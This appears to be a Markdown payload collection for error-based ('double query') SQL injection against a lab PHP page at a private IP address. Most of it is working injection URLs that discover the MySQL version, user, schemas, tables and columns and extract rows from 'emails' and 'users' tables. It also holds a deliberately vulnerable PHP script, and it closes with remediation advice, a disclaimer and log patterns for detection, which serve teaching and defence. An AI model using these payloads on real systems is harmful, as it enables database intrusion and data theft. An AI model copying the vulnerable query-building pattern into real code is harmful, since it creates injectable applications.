# 🔐 Double Query Injection (DQI) - Exploitation Payloads

> **Security Research Documentation**  
> A comprehensive collection of Double Query Injection exploitation techniques for web application penetration testing

---

## 📋 Table of Contents

- [Overview](https://claude.ai/chat/c14654bc-d240-428d-8bc5-02f63b91e1b4#overview)
- [Basic Injection Tests](https://claude.ai/chat/c14654bc-d240-428d-8bc5-02f63b91e1b4#basic-injection-tests)
- [Database Enumeration](https://claude.ai/chat/c14654bc-d240-428d-8bc5-02f63b91e1b4#database-enumeration)
- [Table Discovery](https://claude.ai/chat/c14654bc-d240-428d-8bc5-02f63b91e1b4#table-discovery)
- [Column Extraction](https://claude.ai/chat/c14654bc-d240-428d-8bc5-02f63b91e1b4#column-extraction)
- [Data Exfiltration](https://claude.ai/chat/c14654bc-d240-428d-8bc5-02f63b91e1b4#data-exfiltration)
- [Vulnerable Code Example](https://claude.ai/chat/c14654bc-d240-428d-8bc5-02f63b91e1b4#vulnerable-code-example)

---

## 🎯 Overview

**Double Query Injection** is an advanced SQL injection technique that exploits error-based vulnerabilities in database queries. This method uses nested subqueries to extract sensitive information from the database through intentionally triggered errors.

### Target Application

```
URL: http://192.168.1.239/sqli/double-query-injection.php
Parameter: id
Method: GET
```

---

## 🧪 Basic Injection Tests

### Normal Access

```http
http://192.168.1.239/sqli/double-query-injection.php?id=1
```

### Comment Truncation Test

```http
http://192.168.1.239/sqli/double-query-injection.php?id=1' --+
```

### Conditional TRUE

```http
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND 1 --+
```

### Conditional FALSE

```http
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND 0 --+
```

---

## 🗄️ Database Enumeration

### Extract Database Version

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand()*2)) a
        from information_schema.columns group by a
    ) b
) --+
```

### Extract Current Database Name

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) a
        from information_schema.columns group by a
    ) b
) --+
```

### Extract Current Database User

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)) a
        from information_schema.columns group by a
    ) b
) --+
```

---

## 📊 Table Discovery

### Enumerate Database Names (One-by-one)

#### First Database

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a,(select table_schema from information_schema.tables GROUP BY table_schema limit 0,1),0x3a,0x3a,floor(rand()*2)) a
        from information_schema.columns group by a
    ) b
) --+
```

#### Second Database

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a,(select table_schema from information_schema.tables GROUP BY table_schema limit 1,1),0x3a,0x3a,floor(rand()*2)) a
        from information_schema.columns group by a
    ) b
) --+
```

### Enumerate Tables from Current Database

#### First Table

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand()*2)) a
        from information_schema.columns group by a
    ) b
) --+
```

#### Second Table

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand()*2)) a
        from information_schema.columns group by a
    ) b
) --+
```

#### Third Table

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x3a,0x3a,floor(rand()*2)) a
        from information_schema.columns group by a
    ) b
) --+
```

### Table from Specific Database

```sql
# Table from 'armour_db'
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema="armour_db" limit 0,1),0x3a,0x3a,floor(rand()*2)) a
        from information_schema.columns group by a
    ) b
) --+
```

---

## 📝 Column Extraction

### Get Column Names from Tables

#### First Column from 'emails' Table

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a, (select column_name from information_schema.columns where table_name="emails" AND table_schema=database() limit 0,1), 0x3a,0x3a, floor(rand()*2))
        a from information_schema.columns group by a
    ) b
) --+
```

#### Second Column from 'emails' Table

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a, (select column_name from information_schema.columns where table_name="emails" AND table_schema=database() limit 1,1), 0x3a,0x3a, floor(rand()*2))
        a from information_schema.columns group by a
    ) b
) --+
```

#### Second Column from 'users' Table

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a, (select column_name from information_schema.columns where table_name="users" AND table_schema=database() limit 1,1), 0x3a,0x3a, floor(rand()*2))
        a from information_schema.columns group by a
    ) b
) --+
```

#### Third Column from 'users' Table

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name="users" AND table_schema=database() limit 2,1),0x3a,0x3a,floor(rand()*2))
        a from information_schema.columns group by a
    ) b
) --+
```

---

## 💾 Data Exfiltration

### Get Row Data from Specific Columns

#### First Row from 'email_id' Column in 'emails' Table

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a,(select email_id from emails limit 0,1),0x3a,0x3a, floor(rand()*2)) a
        from information_schema.columns group by a
    ) b
) --+
```

#### Second Row from 'email_id' Column in 'emails' Table

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a,(select email_id from emails limit 1,1),0x3a,0x3a, floor(rand()*2)) a
        from information_schema.columns group by a
    ) b
) --+
```

#### Get First 'id' from 'users' Table

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a,(select id from users limit 0,1),0x3a,0x3a,floor(rand()*2)) a
        from information_schema.columns group by a
    ) b
) --+
```

#### Get Second 'name' from 'emails' Table

```sql
http://192.168.1.239/sqli/double-query-injection.php?id=1' AND (
    select 1 from (
        select count(*), concat(0x3a,0x3a,(select name from emails limit 1,1),0x3a,0x3a,floor(rand()*2)) a
        from information_schema.columns group by a
    ) b
) --+
```

---

## 💻 Vulnerable Code Example

### PHP Implementation (double-query-injection2.php)

```php
<?php
// Include the database connection file that sets up $connection
include("connection.php");
?>

<!DOCTYPE html>
<html>
<head>
    <title>Double Query Injection - 2</title>
</head>
<body>

<div style="margin-top:70px;color:#FFF; font-size:23px; text-align:center">
    <h1>
        <span class="style4">Double Query Injection</span> <br>
        <font size="3" color="#666666">
    </h1>
</div>

<?php
    // Check if 'id' parameter is provided in the GET request
    if (isset($_GET['id'])) {
        
        // Get the raw input from user
        $id = $_GET['id'];
        
        // Wrap the input in double quotes - still vulnerable to injection
        $id = '"' . $id . '"';
        
        // Construct the vulnerable SQL query using unsanitized input
        $query = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
        
        // Output query for debugging (dangerous to leave enabled in production)
        echo $query . "</br>";
        
        // Execute the SQL query
        $result = mysqli_query($connection, $query);
        
        // If query fails, output error info and stop execution
        if (!$result) {
            die("Database Query Failed" . print_r(mysqli_error($connection)));
        }
        
        // Output fixed response ignoring actual query data
        while ($row = mysqli_fetch_assoc($result)) {
            echo "<font color='#0000ff'>";
            echo "Your ID in Our Database<br>";
            echo "Your User Name in Our Database";
            echo "</font>";
        }
    }
?>

</body>
</html>
```

### 🔴 Vulnerability Analysis

**Key Issues:**

1. **Unsanitized Input**: User input is directly embedded in SQL query
2. **Weak Protection**: Wrapping in double quotes is insufficient
3. **Error Disclosure**: Database errors are displayed to users
4. **Debug Output**: Query is echoed to the page

**Exploitation Vector:** The attacker can close the double quotes and inject malicious SQL:

```
?id=1" AND (malicious_query) --+
```

---

## 🛡️ Security Recommendations

### ✅ Remediation Steps

1. **Use Prepared Statements**
    
    ```php
    $stmt = $connection->prepare("SELECT * FROM users WHERE id=? LIMIT 0,1");
    $stmt->bind_param("i", $id);
    $stmt->execute();
    ```
    
2. **Input Validation**
    
    ```php
    $id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
    if ($id === false) {
        die("Invalid input");
    }
    ```
    
3. **Disable Error Display**
    
    ```php
    ini_set('display_errors', 0);
    error_reporting(0);
    ```
    
4. **Remove Debug Output**
    
    - Never echo queries or error messages to users
5. **Implement WAF Rules**
    
    - Block common SQL injection patterns
    - Rate limit suspicious requests

---

## 📚 Hex Encoding Reference

The payloads use hex encoding for special characters:

|Hex Code|Character|Purpose|
|---|---|---|
|`0x3a`|`:`|Delimiter for output|
|`0x2c`|`,`|Comma separator|
|`0x20`||Space character|

---

## ⚠️ Legal Disclaimer

> **WARNING**: These techniques are for **authorized penetration testing only**.  
> Unauthorized access to computer systems is illegal and punishable by law.  
> Always obtain proper authorization before testing any system.

### Ethical Use Guidelines

- ✅ Use only on systems you own or have written permission to test
- ✅ Document all findings responsibly
- ✅ Follow responsible disclosure practices
- ❌ Never use on production systems without authorization
- ❌ Never exfiltrate sensitive data unnecessarily

---

## 🔍 Detection Indicators

**Log Patterns to Monitor:**

- Multiple requests with `information_schema` references
- `concat()`, `floor()`, `rand()` function combinations
- `GROUP BY` with aggregate functions in URL parameters
- Repetitive requests with incrementing `LIMIT` values
- Error messages containing SQL syntax

---

## 📖 Further Reading

- OWASP SQL Injection Guide
- MySQL Error-Based Injection Techniques
- Web Application Penetration Testing Methodology
- Secure Coding Practices

---

<div align="center">

**🔐 Stay Secure | Test Responsibly | Code Safely**

_Documentation generated for educational and authorized security testing purposes_

</div>